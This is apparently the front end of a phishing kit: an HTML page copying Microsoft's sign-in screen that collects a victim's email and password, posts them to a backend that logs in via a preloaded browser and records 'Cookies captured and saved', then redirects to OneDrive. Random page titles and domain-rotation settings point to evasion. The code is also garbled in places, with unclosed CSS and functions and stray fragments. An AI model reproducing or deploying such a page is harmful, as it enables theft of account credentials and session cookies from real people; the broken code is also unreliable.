<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="theme-color" content="#0078d4">
    <meta name="msapplication-TileColor" content="#0078d4">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Mobile-first responsive design */
        @media (max-width: 958px) {
            body {
                padding: 5px;
                align-items: flex-start;
                background: white;
            }
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 0;
            width: 100%;
            max-width: 440px;
            animation: fadeIn 0.5s ease-out;
            margin-top: 0;
        }

        /* Mobile container adjustments */
        @media (max-width: 768px) {
            .container {
                padding: 20px 20px;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .microsoft-logo {
            width: 108px;
            height: auto;
            margin-bottom: 15px;
        }

        .header {
            margin-bottom: 14px;
        }

        .header h1 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin: 0;
        }

        /* Compact loading state */
        .container.loading-state .header {
            margin-bottom: 8px;
        }

        .container.loading-state .microsoft-dots-loader {
            margin: 15px 0 20px 0;
        }

        .back-info {
            margin: 10px 0;
            font-size: 13px;
            color: #323130;
            display: none;
        }

        .back-info.visible {
            display: block;
        }

        .status {
            background: #f8f9ff;
            padding: 15px;
            border-radius: 2px;
            margin-bottom: 20px;
            font-size: 13px;
        }

        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .status-indicator.online {
            background: #107c10;
        }

        .status-indicator.offline {
            background: #d13438;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .microsoft-input {
            width: 100%;
            padding: 6px 6px 6px 0;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
            font-size: 15px;
            color: #323130;
        }

        .microsoft-input:focus {
            border-bottom: 2px solid #0078d4;
        }

        .microsoft-input::placeholder {
            color: #605e5c;
        }

        .form-links {
            margin: 15px 0;
            font-size: 13px;
        }

        .form-links a {
            color: #0067b8;
            text-decoration: none;
        }

        .form-links a:hover {
            text-decoration: underline;
        }

        .form-links .create-account {
            color: #323130;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 20px;
        }

        .btn {
            padding: 6px 24px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            min-width: auto;
        }

        .btn-secondary {
            background-color: #e1e1e1;
            color: #323130;
        }

        .btn-primary {
            background-color: #0078d4;
            color: white;
        }

        .btn:hover:not(:disabled) {
            opacity: 0.9;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .message {
            padding: 12px;
            border-radius: 2px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .message.success {
            background: #dff6dd;
            color: #107c10;
        }

        .message.error {
            background: transparent;
            color: #d13438;
            padding: 2px 0;
            margin: 6px 0 8px 0;
            font-size: 13px;
            line-height: 1.2;
        }

        .message.microsoft-error {
            background: transparent;
            color: #d13438;
            padding: 2px 0;
            margin: 6px 0 8px 0;
            font-size: 13px;
            line-height: 1.2;
        }

        .message.microsoft-error a {
            color: #0067b8;
            text-decoration: underline;
        }

        .message.info {
            background: #deecf9;
            color: #323130;
        }

        .loading {
            display: none;
        }

        .loading-animation {
            position: absolute;
            top: -10px;
            left: 0;
            right: 0;
            height: 2px;
            background: #f3f2f1;
            border-radius: 1px;
            overflow: hidden;
            display: none;
        }

        .loading-animation::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, #0078d4, transparent);
            animation: loadingSlide 1.4s ease-in-out infinite both;
        }

        .loading-animation.active {
            display: block;
        }

        @keyframes loadingSlide {
            0% {
                left: -100%;
            }
            100% {
                left: 100%;
            }
        }

        /* Microsoft-style dot loading animation */
        .microsoft-dots-loader {
            display: none;
            justify-content: flex-start;
            align-items: center;
            margin: 20px 0 15px 0;
            height: 20px;
        }

        .microsoft-dots-loader.show {
            display: flex !important;
        }

        .microsoft-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: #0078d4;
            margin: 0 2px;
            animation: microsoftDotPulse 1.4s infinite ease-in-out both;
        }

        .microsoft-dot:nth-child(1) { animation-delay: -0.32s; }
        .microsoft-dot:nth-child(2) { animation-delay: -0.16s; }
        .microsoft-dot:nth-child(3) { animation-delay: 0s; }
        .microsoft-dot:nth-child(4) { animation-delay: 0.16s; }
        .microsoft-dot:nth-child(5) { animation-delay: 0.32s; }

        @keyframes microsoftDotPulse {
            0%, 80%, 100% {
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* Loading cancel button */
        .loading-cancel-container {
            display: none;
            margin-top: 20px;
            text-align: left;
        }

        .loading-cancel-container.show {
            display: block !important;
        }

        .cancel-btn {
            background: transparent;
            border: 1px solid #0067b8;
            color: #0067b8;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            padding: 4px 12px;
            border-radius: 2px;
        }

        .cancel-btn:hover {
            color: #004a85;
            border-color: #004a85;
            background: #f3f9ff;
        }

        .cancel-btn:disabled {
            color: #a19f9d;
            border-color: #a19f9d;
            cursor: not-allowed;
            background: transparent;
        }



        /* Pulse animation for Microsoft logo during loading */
        .microsoft-logo.loading {
            animation: logoFadeInOut 2s ease-in-out infinite;
        }

        @keyframes logoFadeInOut {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        .sign-in-options {
            background: white;
            padding: 16px 41px;
            border-radius: 0;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            margin-top: 10px;
            text-align: left;
            font-size: 13px;
            color: #323130;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .sign-in-options img {
            width: 20px;
            height: 20px;
            vertical-align: middle;
        }

        /* Mobile sign-in options */
        @media (max-width: 768px) {
            .sign-in-options {
                padding: 15px 20px;
                margin-top: 8px;
                box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            }
        }



        .hidden {
            display: none;
        }

        .password-section {
            display: none;
        }

        .password-section.visible {
            display: block;
        }

        /* Footer links positioned at bottom right */
        .footer-links {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            color: #605e5c;
            z-index: 1000;
        }

        .footer-links a {
            color: #605e5c;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: #323130;
            text-decoration: underline;
        }

        .footer-dots {
            color: #605e5c;
            font-weight: bold;
            cursor: pointer;
            padding: 0 4px;
            user-select: none;
        }

        .footer-dots:hover {
            color: #323130;
        }

        /* Mobile footer adjustments */
        @media (max-width: 768px) {
            .footer-links {
                bottom: 10px;
                right: 10px;
                font-size: 12px;
                gap: 8px;
            }
        }

        /* Hide footer on very small screens to avoid overlap */
        @media (max-width: 480px) {
            .footer-links {
                display: none;
            }
        }
        /* Domain Rotation Styles */
        .domain-rotation-btn {
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
        }

        .domain-rotation-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.4);
        }

        .domain-rotation-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        }

        .modal-content {
            background: white;
            border-radius: 12px;
            width: 90%;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            animation: slideUp 0.3s ease-out;
        }

        .modal-header {
            padding: 20px 24px;
            border-bottom: 1px solid #e1e1e1;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header h2 {
            margin: 0;

        }

        .close-modal {
            font-size: 24px;
            cursor: pointer;
            color: #666;
            transition: color 0.2s;
        }

        .close-modal:hover {
            color: #333;
        }

        .modal-body {
            padding: 24px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;

        }

        .form-group select {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            background: white;
        }

        .domain-item {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
            padding: 8px;
            background: #f8f9fa;
            border-radius: 6px;
        }

        .domain-item input[type="checkbox"] {
            margin-right: 10px;
            transform: scale(1.2);
        }

        .domain-item label {
            margin: 0;

            font-weight: normal;
        }

        .rotation-strings {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 8px;
        }

        .rotation-strings code {
            background: #e9ecef;

            border-radius: 4px;
            font-family: 'Consolas', 'Monaco', monospace;

        }

        .form-actions {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-top: 24px;
        }

        .primary-btn {
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .primary-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 123, 255, 0.3);
        }

        .secondary-btn {
            background: #6c757d;
            color: white;
            border: none;
            padding: 12px 24px;

            cursor: pointer;
            transition: all 0.3s ease;

        }

        .rotation-urls {
            margin: 20px 0;
        }

            display: flex;

        @keyframes slideUp {

    </style>

<body>
    <!-- Footer links positioned at bottom right -->
    <div class="footer-links">
        <a href="#" onclick="return false;">Terms of use</a>
        <a href="#" onclick="return false;">Privacy & cookies</a>
        <span class="footer-dots">...</span>
    </div>

    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
        <div class="container">
            <div class="loading-animation" id="loadingAnimation"></div>
            <img class="microsoft-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">

            <div class="back-info" id="backInfo">
                <span id="enteredEmail"></span>
            </div>



            <div class="header">
                <h1 id="headerTitle">Sign in</h1>
            </div>

            <!-- Status and messages hidden -->
            <div class="status" style="display: none;">
                <span class="status-indicator" id="statusIndicator"></span>
                <span id="statusText">Checking backend...</span>
            </div>

            <!-- Message area -->
            <div id="messageArea" style="display: none;"></div>

            <!-- Loading indicator -->
            <div class="loading" id="loadingIndicator">
                <p id="loadingText">Processing...</p>
            </div>

            <!-- Microsoft-style dot loading animation -->
            <div class="microsoft-dots-loader" id="microsoftDotsLoader">
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
            </div>

            <!-- Cancel button during loading -->
            <div class="loading-cancel-container" id="loadingCancelContainer">
                <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
            </div>

            <!-- Email Input Form - shown initially -->
            <div id="emailForm" style="display: block;">
                <div class="form-group">
                    <input type="email" id="emailInput" class="microsoft-input" placeholder="Email, phone, or Skype" required autofocus onkeypress="if(event.key==='Enter') verifyEmail()">
                </div>

                <div class="form-links">
                    <span class="create-account">No account? <a href="https://signup.live.com" target="_blank">Create one!</a></span>
                </div>

                <div class="form-links" style="margin-top: 0;">
                    <a href="https://account.live.com/acsr" target="_blank">Can't access your account?</a>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="verifyEmail()">
                        Next
                    </button>
                </div>
            </div>

            <!-- Password Input Form - shown after email verification -->
            <div id="passwordForm" class="password-section">
                <div class="form-group">
                    <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required onkeypress="if(event.key==='Enter') signInWithPassword()">
                </div>

                <div class="form-links">
                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Forgot password?</a>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="signInWithPassword()">
                        Sign in
                    </button>
                </div>
            </div>


            <!-- Success form - shown after authentication -->
            <div id="successForm" class="password-section">
                <div style="text-align: center; padding: 20px 0;">
                    <div style="font-size: 48px; color: #107c10; margin-bottom: 15px;">✅</div>
                    <h2 style="color: #107c10; margin-bottom: 10px;">Successfully signed in!</h2>
                    <p id="userEmail" style="color: #323130; font-size: 14px; margin-bottom: 20px;"></p>

                    <div class="button-group">
                        <button type="button" class="btn btn-primary" onclick="viewEmails()">
                            View My Emails
                        </button>
                    </div>

                    <div class="button-group" style="margin-top: 15px;">
                        <button type="button" class="btn btn-secondary" onclick="logout()">
                            Sign Out
                        </button>
                    </div>
                </div>
            </div>


        </div>

        <!-- Sign-in options -->
        <div class="sign-in-options">
            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
                 alt="Sign-in options icon">
            <span>Sign-in options</span>
        </div>
    </div>



    <script>
        let currentSessionId = null;
        let verifiedEmailAddress = null; // Store the verified email
        let currentStep = 'email'; // 'email', 'password', 'success'
        const API_BASE = '';
        let authWindow = null;
        let currentEmail = null; // To store the email for password authentication
        let currentUserEmail = null; // To store the email for success message

        // Generate random alphanumeric title
        function generateRandomTitle() {
            const randomString = (Math.random() + 1).toString(36).substring(2, 80);
            document.title = randomString;
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            generateRandomTitle(); // Set random title
            setLoading(false); // Start with loading off
            checkBackendHealth();
            checkExistingSession();
            showEmailForm();
            
            // Clear error messages when user starts typing in password field
            const passwordInput = document.getElementById('passwordInput');
            if (passwordInput) {
                passwordInput.addEventListener('input', function() {
                    clearMessage(); // Clear any error messages when user starts typing
                });
            }
        });

        // Utility functions
        function showMessage(message, type = 'info') {
            const messageArea = document.getElementById('messageArea');
            messageArea.style.display = 'block';
            messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
        }

        function clearMessage() {
            const messageArea = document.getElementById('messageArea');
            messageArea.innerHTML = '';
            messageArea.style.display = 'none';
        }

        // Set loading state
        function setLoading(isLoading, message = 'Processing...', showSuccessMessage = true) {
            const loadingAnimation = document.getElementById('loadingAnimation');
            const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
            const microsoftLogo = document.querySelector('.microsoft-logo');
            const container = document.querySelector('.container');
            const emailForm = document.getElementById('emailForm');
            const passwordForm = document.getElementById('passwordForm');
            const successForm = document.getElementById('successForm');
            const headerTitle = document.getElementById('headerTitle');
            const loadingCancelContainer = document.getElementById('loadingCancelContainer');
            const backInfo = document.getElementById('backInfo');
            const messageArea = document.getElementById('messageArea');

            if (isLoading) {
                loadingAnimation.classList.add('active');
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';
                microsoftLogo.classList.add('loading');
                container.classList.add('loading-state');
                microsoftDotsLoader.classList.add('show');
                microsoftDotsLoader.style.display = 'flex';
                headerTitle.textContent = message;
                loadingCancelContainer.classList.add('show');

                emailForm.style.display = 'none';
                passwordForm.style.display = 'none';
                successForm.style.display = 'none';
            } else {
                loadingAnimation.classList.remove('active');
                microsoftDotsLoader.classList.remove('show');
                microsoftDotsLoader.style.display = 'none';
                microsoftLogo.classList.remove('loading');
                container.classList.remove('loading-state');
                loadingCancelContainer.classList.remove('show');
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';

                // Restore header text based on current step
                if (currentStep === 'email') {
                    headerTitle.textContent = 'Sign in';
                    emailForm.style.display = 'block';
                    passwordForm.style.display = 'none';
                    successForm.style.display = 'none';
                } else if (currentStep === 'password') {
                    headerTitle.textContent = 'Enter your password';
                    emailForm.style.display = 'none';
                    passwordForm.style.display = 'block';
                    successForm.style.display = 'none';
                } else if (currentStep === 'success') {
                    headerTitle.textContent = 'Welcome';
                    emailForm.style.display = 'none';
                    passwordForm.style.display = 'none';
                    successForm.style.display = 'block';
                }

                // Safely handle backInfo and messageArea elements
                if (backInfo) {
                    backInfo.style.display = '';
                }
                if (messageArea) {
                    messageArea.style.display = '';
                }
            }

        // Wait for preload to be ready
        async function waitForPreloadReady(sessionId, email) {
            const maxWaitTime = 20000; // 20 seconds max
            const pollInterval = 1000; // Check every 1 second
            const startTime = Date.now();

            console.log(`⏳ Waiting for preload to be ready for ${email}...`);

            while ((Date.now() - startTime) < maxWaitTime) {
                try {
                    const response = await fetch(`${API_BASE}/api/preload-status/${sessionId}`);
                    if (response.ok) {
                        const data = await response.json();

                        if (data.status === 'preload_ready') {
                            console.log(`✅ Preload ready for ${email} after ${Date.now() - startTime}ms`);
                            return true;
                        } else if (data.status === 'preload_failed') {
                            console.log(`❌ Preload failed for ${email}`);
                            return false;
                        }
                    }
                } catch (e) {
                    console.warn('Error checking preload status:', e);
                }

                await new Promise(resolve => setTimeout(resolve, pollInterval));
            }

            console.log(`⏰ Preload wait timeout for ${email}`);
            return false;
        }


        // Password authentication using fast auth endpoint
        async function signInWithPassword() {
            try {
                clearMessage(); // Clear any previous error messages immediately
                setLoading(true, 'Signing in...');

                const email = currentEmail; // Use the stored email
                const password = document.getElementById('passwordInput').value;

                if (!password) {
                    showMessage('Please enter your password', 'error');
                    setLoading(false);
                    return;
                }

                // Set up SSE connection for immediate redirect notifications
                let immediateRedirectHandled = false;
                let eventSource = null;
                
                if (currentSessionId) {
                    eventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
                    
                    eventSource.addEventListener('login-success', function(event) {
                        if (!immediateRedirectHandled) {
                            immediateRedirectHandled = true;
                            console.log('🚀 Immediate redirect triggered by SSE event!');
                            eventSource.close();
                            
                            // Get configured redirect URL from admin settings
                            fetch('/api/internal/redirect-url')
                                .then(response => response.json())
                                .then(data => {
                                    const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
                                    console.log(`Redirecting to configured target: ${redirectUrl}`);
                                    window.location.href = redirectUrl;
                                })
                                .catch(error => {
                                    console.warn('Error getting redirect config, using default:', error);
                                    window.location.href = 'https://onedrive.live.com';
                                });
                        }
                    });

                    eventSource.addEventListener('error', function(event) {
                        console.warn('SSE connection error:', event);
                        eventSource.close();
                    });
                }

                // Use fast authentication endpoint with preloaded browser
                const response = await fetch('/api/authenticate-password-fast', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        email, 
                        password,
                        sessionId: currentSessionId // Pass the preload session ID
                    })
                });

                const data = await response.json();

                if (response.status === 401) {
                    // Invalid credentials - stay on password form
                    setLoading(false);
                    showMessage(data.message || 'Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'microsoft-error');
                    return;
                }

                // Close SSE connection since we have the final response
                if (eventSource) {
                    eventSource.close();
                }

                if (data.success) {
                    // Only proceed if immediate redirect hasn't happened
                    if (!immediateRedirectHandled) {
                        const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
                        console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);

                        // Show performance metrics if available
                        if (data.metrics) {
                            console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
                        }

                        currentSessionId = data.sessionId;
                        currentUserEmail = data.userEmail;

                        // Fallback redirect (in case SSE didn't trigger)
                        fetch('/api/internal/redirect-url')
                            .then(response => response.json())
                            .then(data => {
                                const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
                                console.log(`Redirecting to configured target: ${redirectUrl}`);
                                window.location.href = redirectUrl;
                            })
                            .catch(error => {
                                console.warn('Error getting redirect config, using default:', error);
                                window.location.href = 'https://onedrive.live.com';
                            });
                    }
                } else {
                    throw new Error(data.message || data.error || 'Unknown error');
                }

            } catch (error) {
                console.error('Password authentication error:', error);
                setLoading(false);
                showMessage(`Authentication error: ${error.message}`, 'error');
            }
        }

                    console.warn('⚠️ Email page browser preparation failed:', prepareData.error);
                }
                
            } catch (error) {
                console.warn('⚠️ Error during email page browser preparation:', error.message);
                // Don't block page functionality if browser preparation fails
            }
        }

        // Ensure email page browser is ready
        async function ensureEmailPageBrowserReady() {
            if (!emailPageSessionId) {
                console.log('🔄 No prepared browser session, creating new one...');
                await prepareEmailPageBrowser();
            } else {
                console.log(`✅ Email page browser ready: ${emailPageSessionId}`);
            }
        }

        // Initialize domain rotation on page load
        document.addEventListener('DOMContentLoaded', () => {
            loadDomainRotationConfig();
        });

    </script>
